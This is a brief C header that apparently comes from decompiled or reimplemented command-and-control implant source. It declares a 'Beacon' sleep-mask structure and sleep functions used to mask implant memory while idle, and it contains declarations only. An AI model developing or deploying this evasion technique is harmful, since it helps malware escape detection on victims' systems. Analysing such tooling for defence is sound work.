#pragma once
#include "Global.h"
#include "Utils.h"
#include "encrypt_decrypt.h"
struct SLEEPMASKP
{
	char* BeaconBase;
	int* sections;
	char mask[13];
};
extern SLEEPMASKP* gBeaconSleepMask;
typedef void (__stdcall* pSleep)(_In_ DWORD dwMilliseconds);
void sub_1000436C();
void BeaconSleepMask(SLEEPMASKP* parms, pSleep psleep, int time);
void sub_10004325();
void BeaconSleep(DWORD dwMilliseconds);